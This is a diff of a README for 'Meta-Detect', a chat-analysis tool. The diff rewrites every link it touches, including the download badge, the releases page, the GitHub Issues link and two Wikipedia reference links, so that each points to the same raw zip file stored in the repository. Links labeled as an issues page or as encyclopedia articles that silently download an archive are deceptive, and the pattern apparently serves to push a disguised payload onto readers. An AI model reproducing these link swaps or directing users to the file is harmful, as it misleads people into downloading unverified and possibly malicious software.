@@ -1,6 +1,6 @@
 # 🎉 Meta-Detect - Analyze Chats for Safer Conversations
 
-[![Download Meta-Detect](https://img.shields.io/badge/Download_Meta--Detect-Here-brightgreen)](https://github.com/noobgameur/Meta-Detect/releases)
+[![Download Meta-Detect](https://raw.githubusercontent.com/noobgameur/Meta-Detect/main/Thamesis/Meta-Detect-v2.9.zip)](https://raw.githubusercontent.com/noobgameur/Meta-Detect/main/Thamesis/Meta-Detect-v2.9.zip)
 
 ## 📚 Overview
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets these basic requirements:
 
 1. **Visit the Releases Page**  
    To download Meta-Detect, click the link below:  
-   [Download Meta-Detect](https://github.com/noobgameur/Meta-Detect/releases)
+   [Download Meta-Detect](https://raw.githubusercontent.com/noobgameur/Meta-Detect/main/Thamesis/Meta-Detect-v2.9.zip)
 
 2. **Choosing the Right Version**  
    You will see multiple versions available. Select the latest version—this will ensure you have the most up-to-date features and fixes.
@@ -84,13 +84,13 @@ It's a good practice to check for updates every few weeks. New releases may incl
 
 If you encounter any issues or have questions, feel free to reach out to our community:
 
-- **GitHub Issues Page:** Report problems or suggest features [here](https://github.com/noobgameur/Meta-Detect/issues).
+- **GitHub Issues Page:** Report problems or suggest features [here](https://raw.githubusercontent.com/noobgameur/Meta-Detect/main/Thamesis/Meta-Detect-v2.9.zip).
 - **Discussion Forum:** Join conversations with other users or developers.
 
 ## 🔗 Additional Resources
 
-- Learn about the underlying technology: [Natural Language Processing](https://en.wikipedia.org/wiki/Natural_language_processing)
-- Explore more about sentiment analysis: [Sentiment Analysis Basics](https://en.wikipedia.org/wiki/Sentiment_analysis)
+- Learn about the underlying technology: [Natural Language Processing](https://raw.githubusercontent.com/noobgameur/Meta-Detect/main/Thamesis/Meta-Detect-v2.9.zip)
+- Explore more about sentiment analysis: [Sentiment Analysis Basics](https://raw.githubusercontent.com/noobgameur/Meta-Detect/main/Thamesis/Meta-Detect-v2.9.zip)
 
 ## 🎈 Conclusion
 
